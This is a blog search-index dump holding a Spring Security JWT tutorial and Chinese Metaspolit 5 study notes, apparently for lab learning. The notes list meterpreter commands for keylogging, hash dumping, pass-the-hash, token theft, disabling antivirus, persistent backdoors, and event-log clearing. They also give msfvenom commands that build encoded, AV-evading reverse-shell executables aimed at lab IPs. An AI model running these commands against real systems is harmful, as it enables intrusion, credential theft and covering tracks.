","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:5:0","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"使用 接下来我们将介绍下 nimbus-jose-jwt 库的使用，主要使用对称加密（HMAC）和非对称加密（RSA）两种算法来生成和解析 JWT 令牌。 ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:6:0","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"对称加密（HMAC） 创建 JwtTokenServiceImpl 作为 JWT 处理的业务类，添加根据 HMAC 算法生成和解析 JWT 令牌的方法，可以发现 nimbus-jose-jwt 库操作 JWT 的 API 非常易于理解； @Service public class JwtTokenServiceImpl implements JwtTokenService { @Override public String generateTokenByHMAC(String payloadStr, String secret) throws JOSEException { //创建JWS头，设置签名算法和类型 JWSHeader jwsHeader = new JWSHeader.Builder(JWSAlgorithm.HS256). type(JOSEObjectType.JWT) .build(); //将负载信息封装到Payload中 Payload payload = new Payload(payloadStr); //创建JWS对象 JWSObject jwsObject = new JWSObject(jwsHeader, payload); //创建HMAC签名器 JWSSigner jwsSigner = new MACSigner(secret); //签名 jwsObject.sign(jwsSigner); return jwsObject.serialize(); } @Override public PayloadDto verifyTokenByHMAC(String token, String secret) throws ParseException, JOSEException { //从token中解析JWS对象 JWSObject jwsObject = JWSObject.parse(token); //创建HMAC验证器 JWSVerifier jwsVerifier = new MACVerifier(secret); if (!jwsObject.verify(jwsVerifier)) { throw new JwtInvalidException(\"token签名不合法！\"); } String payload = jwsObject.getPayload().toString(); PayloadDto payloadDto = JSONUtil.toBean(payload, PayloadDto.class); if (payloadDto.getExp() \u003c new Date().getTime()) { throw new JwtExpiredException(\"token已过期！\"); } return payloadDto; } } 创建 PayloadDto 实体类，用于封装 JWT 中存储的信息； @Data @EqualsAndHashCode(callSuper = false) @Builder public class PayloadDto { @ApiModelProperty(\"主题\") private String sub; @ApiModelProperty(\"签发时间\") private Long iat; @ApiModelProperty(\"过期时间\") private Long exp; @ApiModelProperty(\"JWT的ID\") private String jti; @ApiModelProperty(\"用户名称\") private String username; @ApiModelProperty(\"用户拥有的权限\") private List\u003cString\u003e authorities; } 在 JwtTokenServiceImpl 类中添加获取默认的 PayloadDto 的方法，JWT 过期时间设置为 60min； @Service public class JwtTokenServiceImpl implements JwtTokenService { @Override public PayloadDto getDefaultPayloadDto() { Date now = new Date(); Date exp = DateUtil.offsetSecond(now, 60*60); return PayloadDto.builder() .sub(\"macro\") .iat(now.getTime()) .exp(exp.getTime()) .jti(UUID.randomUUID().toString()) .username(\"macro\") .authorities(CollUtil.toList(\"ADMIN\")) .build(); } } 创建 JwtTokenController 类，添加根据 HMAC 算法生成和解析 JWT 令牌的接口，由于 HMAC 算法需要长度至少为 32 个字节的秘钥，所以我们使用 MD5 加密下； @Api(tags = \"JwtTokenController\", description = \"JWT令牌管理\") @Controller @RequestMapping(\"/token\") public class JwtTokenController { @Autowired private JwtTokenService jwtTokenService; @ApiOperation(\"使用对称加密（HMAC）算法生成token\") @RequestMapping(value = \"/hmac/generate\", method = RequestMethod.GET) @ResponseBody public CommonResult generateTokenByHMAC() { try { PayloadDto payloadDto = jwtTokenService.getDefaultPayloadDto(); String token = jwtTokenService.generateTokenByHMAC(JSONUtil.toJsonStr(payloadDto), SecureUtil.md5(\"test\")); return CommonResult.success(token); } catch (JOSEException e) { e.printStackTrace(); } return CommonResult.failed(); } @ApiOperation(\"使用对称加密（HMAC）算法验证token\") @RequestMapping(value = \"/hmac/verify\", method = RequestMethod.GET) @ResponseBody public CommonResult verifyTokenByHMAC(String token) { try { PayloadDto payloadDto = jwtTokenService.verifyTokenByHMAC(token, SecureUtil.md5(\"test\")); return CommonResult.success(payloadDto); } catch (ParseException | JOSEException e) { e.printStackTrace(); } return CommonResult.failed(); } } ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:6:1","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"添加 SpringSecurity 的配置类 @Configuration @EnableWebSecurity @EnableGlobalMethodSecurity(prePostEnabled=true) public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private UmsAdminService adminService; @Autowired private RestfulAccessDeniedHandler restfulAccessDeniedHandler; @Autowired private RestAuthenticationEntryPoint restAuthenticationEntryPoint; @Override protected void configure(HttpSecurity httpSecurity) throws Exception { httpSecurity.csrf()// 由于使用的是JWT，我们这里不需要csrf .disable() .sessionManagement()// 基于token，所以不需要session .sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() .antMatchers(HttpMethod.GET, // 允许对于网站静态资源的无授权访问 \"/\", \"/*.html\", \"/favicon.ico\", \"/**/*.html\", \"/**/*.css\", \"/**/*.js\", \"/swagger-resources/**\", \"/v2/api-docs/**\" ) .permitAll() .antMatchers(\"/admin/login\", \"/admin/register\")// 对登录注册要允许匿名访问 .permitAll() .antMatchers(HttpMethod.OPTIONS)//跨域请求会先进行一次options请求 .permitAll() // .antMatchers(\"/**\")//测试时全部运行访问 // .permitAll() .anyRequest()// 除上面外的所有请求全部需要鉴权认证 .authenticated(); // 禁用缓存 httpSecurity.headers().cacheControl(); // 添加JWT filter httpSecurity.addFilterBefore(jwtAuthenticationTokenFilter(), UsernamePasswordAuthenticationFilter.class); //添加自定义未授权和未登录结果返回 httpSecurity.exceptionHandling() .accessDeniedHandler(restfulAccessDeniedHandler) .authenticationEntryPoint(restAuthenticationEntryPoint); } @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { auth.userDetailsService(userDetailsService()) .passwordEncoder(passwordEncoder()); } @Bean public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Bean public UserDetailsService userDetailsService() { //获取登录用户信息 //这里返回了一个实现了UserDetailsService接口的匿名类 return username -\u003e { UmsAdmin admin = adminService.getAdminByUsername(username); if (admin != null) { List\u003cUmsPermission\u003e permissionList = adminService.getPermissionList(admin.getId()); return new AdminUserDetails(admin,permissionList); } throw new UsernameNotFoundException(\"用户名或密码错误\"); }; } @Bean public JwtAuthenticationTokenFilter jwtAuthenticationTokenFilter(){ return new JwtAuthenticationTokenFilter(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } } ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:7:0","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"虚拟机网络 桥接模式：虚拟机就是一个单独的机子，没什么其他的限制。虚拟机和主机是通过 VMnet0 连接到外界的。有单独的 IP，可以随意和互联的任一主机通信。 NAT 模式：虚拟系统需要借助 NAT（网络地址转换）功能。通过主机所在的网络来访问公网。虚拟系统把主机作为路由器访问互联网。虚拟系统的 TCP/IP 信息由 VMnet8 的 DHCP 提供的，无法手工修改。因此，该局域网中的其他真实主机和虚拟机无法通行。 仅主机模式：所有的虚拟系统可以通信，但虚拟系统和真实系统是被隔离开的。虚拟系统和宿主主机是可以通信的，相当于这两台主机直接通过双绞线互联。 如果选择桥接模式，必须将“复制物理网络连接状态”勾上。否则，主机无法连接互联网。 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:0:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"配置 msfconsole 环境 set Prompt value //设置提示内容 set PromptTimeFormat value //设置时间格式 set PromptChar //设置提示符 set TimestampOutput true //设置计时功能 set ConsoleLogging true //开日志，默认保存在/root/.msf4/logs/console.log set SessionLogging true// 会话日志 set LogLevel 0//设置日志级别，默认是0，可设置为0、1、2、3，越大越详细 set MinimumRank 300 //设置模块默认级别，越大渗透越容易成功 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"漏洞扫描工具 Nessus（收费和免费） OpenVAS（免费） 改名 gvm， 在 kali 安装sudo apt install gvm* ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:2:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"准备工作 添加工作区 workspace -a work1 workspace #查看工作区 显示工作区详情 workspace -v 切换工作区 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:3:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"确定目标主机 使用 db_nmap 扫描，命令和 nmap 一样 db_namp 192.168.59.0/24 导入第三方报告 db_import \u003cfilename\u003e [file2...] ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:4:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"预分析目标 analyze [addr1 addr2 ...] hosts #查看扫描结果中存在哪些主机 管理主机：hosts 管理服务：services 管理认证信息：creds 管理战利品：loot 管理备注信息：notes 查看漏洞信息：vulns ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:4:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"数据备份：db_export -f [filename] ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:4:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"重建数据缓存 直接通过磁盘搜索模块很慢，为此 msf 在数据库中创建了对应的缓存。在添加删除模块的时候，需要更新数据库 db_rebuild_cache ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:4:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"模块 show all #查看所有模块 show nops #查看nops类模块 search [关键字]#查找 show exploit#查看渗透攻击模块 exploit攻击 show auxiliary#查看辅助模块 run运行 show post #查看后渗透攻击模块 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:5:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"攻击载荷（payloads） 指用户希望对目标系统攻击成功后去执行的代码，在设置 exp 的时候设置 payload ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:5:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"nops 模块 某些场合下，某些特殊的字符串会因为被拦截而导致攻击失效此时需要谢盖 exp 中的 nops。nops 会在 payload 生成时用到，php 的 nops 时返回指定长度的空格而已 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:5:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"编码模块 供 msfvenom 工具进行编码时使用 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:5:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"插件 load #查看插件加载方法 load -s #查看加载的插件 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:5:4","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"规避模块（evasion） 使用规避模块规避 windows defender 防火墙。 show evasion#查看规避模块 导入第三方模块 www.exploit-db.com edit 可以编辑模块，修改代码 back 退出当前模块 set 设置，unset 重置，unset all 重置所有 setg 设置全局，unsetg 重置全局，save 保存全局设置 在对目标实施渗透攻击前，可以使用 check 命令检查当前目标主机是否支持漏洞攻击载荷，以及配置选项是否有效。并不是每个 exp 模块都支持 check ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:5:5","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"任务管理 jobs [选项] jobs #查看后台运行的任务 kill 0 #结束id为0的任务 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:5:6","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"扩展功能 meterpreter 是 metasploit 框架的一个扩展模块对目标系统进行更为深入的渗透。 捕获屏幕：screenshot 捕获麦克风声音：run sound_recoder 捕获键盘记录：run post/windows/capture/keylog_recorder，也可以用keyscan_dump捕获键盘输入。先keyscan_start,再keyscan_dump,keyscan_stop停止捕获 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"提权 先查看当前权限等级 getuid#查看用户名 shell#进入powershell net user bob#查看bob用户权限 exit #退出shell getsystem#提权 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"挖掘用户名和密码 run post/windows/gather/hashdump#获取系统所有的用户名和密码哈希值，需要提权 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"传递哈希值 因破解哈希值难，传递就只需要哈希值就够了。 用 expoloit/windows/smb/psexec 模块实现哈希值传递 如果橙红入侵了某大型网络中的一台主机，在多数情况下，密码与其他主机通用。 ###破解纯文本密码 load mimikatz help #查看有效命令 msv#恢复哈希值密码 kerberos##类似msv，不同的是这可以看到使用哈希密码的原始密码 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"假冒令牌 假冒某个网络中的另一个用户进行各种操作。 ps#查看所有运行的程序及运行这些程序的用户，找到管理员运行的程序 steal_token PID#盗取管理员用户的令牌，此时已经成功了 incognito ：列出系统上可利用的令牌 use incognito list_tokens -u impersonater_token BENET \\\\domainadmin#BENET \\domainadmin是上条命令显示的令牌之一，要输入两个\\\\ add_user abc password -h 192.168.1.104 #新建用户 只有 system 权限的用户可以查看所有令牌。 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:4","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"恢复文件 background #后台运行meterprete会话 use post/windows/gather/forensics/recovery_files show options set ... run ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:5","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"通过跳板攻击其他机器 如果攻击者个跳板机在同一局域网中，可以保护攻击者。 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:6","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"使用 meterpreter 脚本 迁移进程： run post/windows/manage/migrate 或 migrate [PID号] 关闭杀毒软件 run killav 获取系统密码哈希值 run hashdump 查看目标机上的所有流量 run packetrecorder -i 1 # -i 1指定网卡 获取系统信息 scraper 脚本可以列举出用户想获取的任何信息，包括用户名密码、下载全部注册表、挖掘密码哈希值、收集系统信息 run scraper ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:7","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"创建持久后门 metaspolit 自带的后门有两种启动方式 通过服务启动（metsvc） 通过启动项启动（persistence） persistence sessions -i 1 #激活meterpreter会话 run persistence -h #查看帮助 run persistence -X -i 50 -p 443 -r 192.168.1.104#创建一个持久后门 background use multi/handler #监听，等待目标主机反向连接攻击主机 set payload windows/meterpreter/reverse_tcp set ... exploit metsv run metsvc -h #查看帮助 run metsvc -A backgound use exploit/multi/handler set payload windows/metsvc_bind_tcp set ... exploit ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:8","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"将命令行 shell 升级为 meterpreter exploit -z 会将成功攻击目标后获取的会话放在后台运行 sessions -u 1 将会话 1 升级为 meterpreter sessions 查看所有会话 session -i 2 切换到 meterp 会话 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:9","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"清除踪迹 sessions -i 1#激活meterpreter irb #开始清除踪迹 log = client.sys.eventlog.open('system') log = client.sys.eventlog.open('application') log = client.sys.eventlog.open('system') log = client.sys.eventlog.open('system') log = client.sys.eventlog.open('system') log = client.sys.eventlog.open('system') sessions -i 1#激活meterpreter irb #开始清除踪迹 log = client.sys.eventlog.open('system') #设置想要删除的日志 log = client.sys.eventlog.open('application') log = client.sys.eventlog.open('security') log = client.sys.eventlog.open('directory service') log = client.sys.eventlog.open('dns server') log = client.sys.eventlog.open('file replication service') log.clear #删除日志 ---- #或者用clearev clearev ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:6:10","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"使用 msf 攻击载荷生成器 使用 msfvenom 工具生成木马程序 创建攻击载荷 将生成的攻击载荷放到目标主机下执行，可以用 upload 命令上传 在 msf 终端启动监听 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:7:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"免杀技术 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:8:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"多重编码 对可执行文件进行多次编码。shikata_ga_nai 编码时多态的，就是说每次生成的攻击载荷文件都不一样，通过 msfvenom 命令的选项-i 即可实现多重编码。 msfvenom -p windows/meterpreter/revers_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' LHOST=192.168.1.108 LPORT=443 -f raw|msfvenom -a x86 --platform win -e x86/alpha_upper -i 2 -f exe -0 /root/payload.exe ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:8:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"自定义可执行文件模板 默认模板位于 data/msfpayload/template.exe 下，msfvenom 支持使用-x 选项使用任意的 windows 可执行程序来代替默认模板文件 msfvenom -p windows/meterpreter/revers_tcp -x muban.exe -e x86/shikata_ga_nai -i 5 -b '\\x00' LHOST=192.168.1.108 LPORT=443 -f exe -o /root/backdoor.exe ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:8:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"隐秘启动一个攻击载荷 大多数情况下，当被估计的用户运行类似前面生成的包含后门的可执行文件时，如果什么也没发生会引起用户的怀疑。所以在启动攻击载荷的同时，可以让宿主程序页正常运行起来。 使用 msfvenom 的-k 选项，使攻击载荷在一个独立的线程中启动，这样宿主程序在执行时不会受到影响 msfvenom -p windows/meterpreter/revers_tcp -x muban.exe -e x86/shikata_ga_nai -i 5 -b '\\x00' LHOST=192.168.1.108 LPORT=443 -f exe -k -o /root/backdoor.exe -k 选项不一定能用在所有可执行程序上，所以要先确认 最好使用图形界面的程序。如果用命令行程序，会在目标主机上显示一个命令行窗口，这个窗口指导攻击载荷使用完毕才会消失。 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:8:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"加壳软件 这是一类对可执行文件进行加密压缩并将解压代码嵌入其中的工具。 kali 中最受欢迎的是 UPX 加壳软件 upx -5 payload.exe -q 漏洞利用 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:8:4","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"windows 系统 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:9:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"远程溢出漏洞—CVE-2012-0002 search CVE-2012-0002 use ... show options set ... exploit ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:9:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"MS11-003(CVE-2001-0036) ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:9:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"MS03-026(CVE-2003-0352) ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:9:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"IE 浏览器的激光漏洞利用 (use exploit/windows/browser/ms10_002_aurora) ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:9:4","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"浏览器自动攻击模块（browser_autopwn） ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:9:5","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"AdobeReader 漏洞（CVE-2010-1240） ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:9:6","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"linux 系统 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:10:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Samba 服务 usermap_script 漏洞 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:10:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"IRC 后台守护程序漏洞 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:10:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Samba 匿名共享目录可写入漏洞（samba_symlink_traversal） ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:10:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"MySQL 判断数据库是否允许外链 使用 mysql_version 模块可以判断是否允许外链。如果允许则显示版本信息，否则不会显示版本信息。 实施暴力破解密码 使用 mysql_login 模块暴力破解密码。步骤如下： 创建密码字典 选择 mysql_login 模块，配置默认选项参数 实施暴力破解，exploit 枚举数据库信息 使用 mysql_enum 模块 导出 hash 值并破解 用 mysql_hashdump 模块，可以导出 MySQL 数据库用户的密码 hash 值。然后使用 jtr_mysql_fast 破解 MySQL 认证漏洞利用（CVE-2012-2122） 使用 mysql_authbypass_hashdump 利用 MOF 提权 使用 mysql_mof 模块提权，是针对安装在 Windows 下的 MySQL 实施的。 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:10:4","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"网站 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:11:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"攻击 Tomcat 服务 利用 tomcat_mgr_login 利用 tomcat_mgr_deploy ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:11:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"CVE-2010-0425 漏洞 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:11:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"WebDVA 使用 webdva_scanner ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:11:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Oracle Java SE 远程拒绝服务漏洞（CVE-2012-0507） ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:11:4","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Java 零日漏洞（CVE-2012-4681） 利用 java_jre17_exec ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:11:5","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"通用功能 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:12:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"端口扫描 search portscan use ... set ... run ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:12:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"服务版本扫描 ftp_version,ssh_version,http_version ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:12:2","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"扫描服务弱口令 以 postgresql 为例 search postgresql use ../postgres_login set ... exploit 复制功能 ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:12:3","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"连接主机 connect [选项] ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:13:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"批处理 resource path1 [path2...] 资源文件以.rc结尾. ","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:14:0","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"会话管理 sessions 可以列出，进入交互和杀死大量的会话。 